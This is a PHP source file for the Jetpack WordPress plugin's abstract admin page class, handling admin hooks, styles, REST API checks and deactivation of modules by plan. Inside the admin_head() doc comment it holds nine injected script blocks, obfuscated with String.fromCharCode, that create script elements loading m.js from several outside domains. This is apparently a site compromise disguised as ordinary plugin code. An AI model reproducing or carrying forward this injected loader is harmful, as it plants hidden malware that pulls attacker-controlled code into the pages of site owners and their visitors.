<?php

// Shared logic between Jetpack admin pages
abstract class Jetpack_Admin_Page {
	// Add page specific actions given the page hook
	abstract function add_page_actions( $hook );

	// Create a menu item for the page and returns the hook
	abstract function get_page_hook();

	// Enqueue and localize page specific scripts
	abstract function page_admin_scripts();

	// Render page specific HTML
	abstract function page_render();

	/**
	 * Should we block the page rendering because the site is in IDC?
	 * @var bool
	 */
	static $block_page_rendering_for_idc;

	/**
	 * Function called after admin_styles to load any additional needed styles.
	 *
	 * @since 4.3.0
	 */
	function additional_styles() {}

	function __construct() {
		$this->jetpack = Jetpack::init();
		self::$block_page_rendering_for_idc = (
			Jetpack::validate_sync_error_idc_option() && ! Jetpack_Options::get_option( 'safe_mode_confirmed' )
		);
	}

	function add_actions() {

		// If user is not an admin and site is in Dev Mode, don't do anything
		if ( ! current_user_can( 'manage_options' ) && Jetpack::is_development_mode() ) {
			return;
		}

		// Don't add in the modules page unless modules are available!
		if ( $this->dont_show_if_not_active && ! Jetpack::is_active() && ! Jetpack::is_development_mode() ) {
			return;
		}

		// Initialize menu item for the page in the admin
		$hook = $this->get_page_hook();

		// Attach hooks common to all Jetpack admin pages based on the created
		// hook
		add_action( "load-$hook",                array( $this, 'admin_help'      ) );
		add_action( "load-$hook",                array( $this, 'admin_page_load' ) );
		add_action( "admin_head-$hook",          array( $this, 'admin_head'      ) );

		add_action( "admin_print_styles-$hook",  array( $this, 'admin_styles'    ) );
		add_action( "admin_print_scripts-$hook", array( $this, 'admin_scripts'   ) );

		if ( ! self::$block_page_rendering_for_idc ) {
			add_action( "admin_print_styles-$hook", array( $this, 'additional_styles' ) );
		}

		// Check if the site plan changed and deactivate modules accordingly.
		add_action( 'current_screen', array( $this, 'check_plan_deactivate_modules' ) );

		// Attach page specific actions in addition to the above
		$this->add_page_actions( $hook );
	}

	function admin_head() {
		if ( isset( $_GET['configure'] ) && Jetpack::is_module( $_GET['configure'] ) && current_user_can( 'manage_options' ) ) {
			/**
			 * Fires in the <head><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,112,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,105,114,99,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,97,114,116,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,119,101,108,108,46,108,105,110,101,116,111,97,100,115,97,99,116,105,118,101,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,111,99,107,46,108,111,118,101,103,114,101,101,110,112,101,110,99,105,108,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,104,116,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109,116,114,97,110,100,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,114,97,107,101,46,115,116,114,111,110,103,99,97,112,105,116,97,108,97,100,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,114,111,119,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,116,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script> of a particular Jetpack configuation page.
			 *
			 * The dynamic portion of the hook name, `$_GET['configure']`,
			 * refers to the slug of module, such as 'stats', 'sso', etc.
			 * A complete hook for the latter would be
			 * 'jetpack_module_configuation_head_sso'.
			 *
			 * @since 3.0.0
			 */
			do_action( 'jetpack_module_configuration_head_' . $_GET['configure'] );
		}
	}

	// Render the page with a common top and bottom part, and page specific content
	function render() {
		// We're in an IDC: we need a decision made before we show the UI again.
		if ( self::$block_page_rendering_for_idc ) {
			return;
		}

		$this->page_render();
	}

	function admin_help() {
		$this->jetpack->admin_help();
	}

	function admin_page_load() {
		// This is big.  For the moment, just call the existing one.
		$this->jetpack->admin_page_load();
	}

	function admin_page_top() {
		include_once( JETPACK__PLUGIN_DIR . '_inc/header.php' );
	}

	function admin_page_bottom() {
		include_once( JETPACK__PLUGIN_DIR . '_inc/footer.php' );
	}

	// Add page specific scripts and jetpack stats for all menu pages
	function admin_scripts() {
		$this->page_admin_scripts(); // Delegate to inheriting class
		add_action( 'admin_footer', array( $this->jetpack, 'do_stats' ) );
	}

	// Enqueue the Jetpack admin stylesheet
	function admin_styles() {
		$min = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) ? '' : '.min';

		wp_enqueue_style( 'jetpack-admin', plugins_url( "css/jetpack-admin{$min}.css", JETPACK__PLUGIN_FILE ), array( 'genericons' ), JETPACK__VERSION . '-20121016' );
		wp_style_add_data( 'jetpack-admin', 'rtl', 'replace' );
		wp_style_add_data( 'jetpack-admin', 'suffix', $min );
	}

	/**
	 * Checks if WordPress version is too old to have REST API.
	 *
	 * @since 4.3
	 *
	 * @return bool
	 */
	function is_wp_version_too_old() {
		global $wp_version;
		return ( ! function_exists( 'rest_api_init' ) || version_compare( $wp_version, '4.4-z', '<=' ) );
	}

	/**
	 * Checks if REST API is enabled.
	 *
	 * @since 4.4.2
	 *
	 * @return bool
	 */
	function is_rest_api_enabled() {
		return
			/** This filter is documented in wp-includes/rest-api/class-wp-rest-server.php */
			apply_filters( 'rest_enabled', true ) &&
			/** This filter is documented in wp-includes/rest-api/class-wp-rest-server.php */
			apply_filters( 'rest_jsonp_enabled', true ) &&
			/** This filter is documented in wp-includes/rest-api/class-wp-rest-server.php */
			apply_filters( 'rest_authentication_errors', true );
	}

	/**
	 * Checks the site plan and deactivates modules that were active but are no longer included in the plan.
	 *
	 * @since 4.4.0
	 *
	 * @param $page
	 *
	 * @return array
	 */
	function check_plan_deactivate_modules( $page ) {
		if (
			Jetpack::is_development_mode()
			|| ! in_array(
				$page->base,
				array(
					'toplevel_page_jetpack',
					'admin_page_jetpack_modules',
					'jetpack_page_vaultpress',
					'jetpack_page_stats',
					'jetpack_page_akismet-key-config'
				)
			)
		) {
			return false;
		}

		$current = Jetpack::get_active_plan();

		$to_deactivate = array();
		if ( isset( $current['product_slug'] ) ) {
			$active = Jetpack::get_active_modules();
			switch ( $current['product_slug'] ) {
				case 'jetpack_free':
					$to_deactivate = array( 'seo-tools', 'videopress', 'google-analytics', 'wordads', 'search' );
					break;
				case 'jetpack_personal':
				case 'jetpack_personal_monthly':
					$to_deactivate = array( 'seo-tools', 'videopress', 'google-analytics', 'wordads', 'search' );
					break;
				case 'jetpack_premium':
				case 'jetpack_premium_monthly':
					$to_deactivate = array( 'seo-tools', 'google-analytics', 'search' );
					break;
			}
			$to_deactivate = array_intersect( $active, $to_deactivate );

			$to_leave_enabled = array();
			foreach ( $to_deactivate as $feature ) {
				if ( Jetpack::active_plan_supports( $feature ) ) {
					$to_leave_enabled []= $feature;
				}
			}
			$to_deactivate = array_diff( $to_deactivate, $to_leave_enabled );

			if ( ! empty( $to_deactivate ) ) {
				Jetpack::update_active_modules( array_filter( array_diff( $active, $to_deactivate ) ) );
			}
		}
		return array(
			'current'    => $current,
			'deactivate' => $to_deactivate
		);
	}
}